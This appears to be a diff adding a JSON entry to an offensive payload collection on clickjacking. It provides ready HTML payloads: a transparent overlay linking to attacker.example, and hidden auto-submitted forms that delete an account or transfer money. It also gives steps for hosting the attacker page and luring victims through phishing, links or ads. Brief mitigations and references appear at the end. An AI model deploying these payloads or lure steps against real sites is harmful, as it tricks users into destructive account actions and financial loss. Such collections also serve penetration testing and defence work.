@@ -1,0 +1,69 @@
+{
+  "id": "payload_000014",
+  "important": {
+    "title": "Clickjacking - UI Redressing & Button/Form Hijack",
+    "category": "UI Manipulation",
+    "sub_category": "Overlay / Form Hijack",
+    "tags": ["clickjacking","ui-redressing","overlay","form-hijack","hidden-form"],
+    "targets": { "os": ["Any"], "system": ["Web App","UI"] },
+    "risk": "high"
+  },
+  "variants": [
+    {
+      "match": { "os": ["Any"], "system": ["UI Redressing / Overlay"] },
+      "payload": {
+        "explanation": "Transparent overlay covering the page with hidden actionable elements to trick user clicks.",
+        "code": "<div style=\"opacity:0; position:absolute; top:0; left:0; height:100%; width:100%;\">\n  <a href=\"https://attacker.example/trigger-action\">Click me</a>\n</div>",
+        "run_context": "Host on attacker page; lure victim to that page while target is framed or loaded under overlay.",
+        "placeholders": { "ATTACKER_URL": "https://attacker.example/trigger-action" },
+        "notes": "Target must be framable or attacker must overlay over social-engineered content."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["Button/Form Hijacking"] },
+      "payload": {
+        "explanation": "Hidden form submitted when user clicks a visible element on attacker page, causing state-change on target.",
+        "code": "<button onclick=\"document.getElementById('h').submit()\">Click me</button>\n<form id=\"h\" action=\"https://legitimate-site.com/account/delete\" method=\"POST\" style=\"display:none;\">\n  <input type=\"hidden\" name=\"confirm\" value=\"1\">\n</form>",
+        "run_context": "Attacker page (or framed scenario); click triggers hidden form submission to target.",
+        "placeholders": { "TARGET_ACTION": "https://legitimate-site.com/account/delete" },
+        "notes": "Works when target doesn't have CSRF protections or validates Origin/Referer."
+      }
+    }
+  ],
+  "usage": {
+    "steps": [
+      "Confirm the target page can be framed (no X-Frame-Options/frame-ancestors).",
+      "Create an attacker page with overlay or hidden form aligned to the target UI.",
+      "Host attacker page and lure target to open it (phishing, link, ad, etc.).",
+      "Verify with test accounts that clicks trigger the intended action."
+    ],
+    "tools": ["Browser devtools", "Burp Suite (for testing)"],
+    "required_params": {
+      "target_url": { "required": true, "example": "https://legitimate-site.com/login" },
+      "action_to_trigger": { "required": true, "example": "POST /account/delete" }
+    },
+    "code_samples": [
+      {
+        "title": "Overlay PoC",
+        "description": "Transparent overlay with a hidden link.",
+        "code": "<div style=\"opacity:0; position:absolute; top:0; left:0; height:100%; width:100%;\"><a href=\"https://attacker/trigger\">Click</a></div>",
+        "placeholders": { "ATTACKER_TRIGGER": "https://attacker/trigger" },
+        "run_context": "browser"
+      },
+      {
+        "title": "Hidden Form PoC",
+        "description": "Hidden form submitted via visible button.",
+        "code": "<button onclick=\"document.getElementById('h').submit()\">Click</button><form id=\"h\" action=\"https://legit/transfer\" method=\"POST\" style=\"display:none;\"><input name=\"amount\" value=\"1000\"></form>",
+        "placeholders": { "LEGIT_TRANSFER": "https://legit/transfer" },
+        "run_context": "browser"
+      }
+    ],
+    "mitigations": [
+      "Set X-Frame-Options: DENY or SAMEORIGIN.",
+      "Use CSP frame-ancestors to restrict framing to trusted domains.",
+      "Enforce CSRF tokens and validate Origin/Referer on state-changing requests."
+    ],
+    "references": ["OWASP Clickjacking Cheat Sheet", "PortSwigger - Clickjacking"]
+  },
+  "system": { "version": "2.0.0", "source": "PayloadsAllTheThings" }
+}
